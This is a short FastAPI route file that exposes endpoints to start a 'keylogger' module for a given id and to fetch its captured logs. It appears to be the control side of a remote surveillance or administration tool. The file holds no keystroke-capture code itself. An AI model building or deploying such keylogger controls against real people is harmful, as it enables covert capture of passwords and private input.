# api/routes/keyloggerRoutes.py
from fastapi import APIRouter, Depends, Query, Request
from api.service.keyloggerService import KeyloggerService

router = APIRouter()

def get_keylogger_service(request: Request) -> KeyloggerService:
    data_manager = request.app.state.app_state.data_manager
    return KeyloggerService(data_manager.keylogger_module, data_manager.user_repository)

@router.get("/api/modules/keylogger/logs")
async def get_keylogger_logs(id: str = Query(None), keylogger_service: KeyloggerService = Depends(get_keylogger_service)):
    return keylogger_service.get_keylogger_logs(id)

@router.post("/api/modules/keylogger/start")
async def start_keylogger(id: str = Query(None), keylogger_service: KeyloggerService = Depends(get_keylogger_service)):
    return await keylogger_service.start(id)
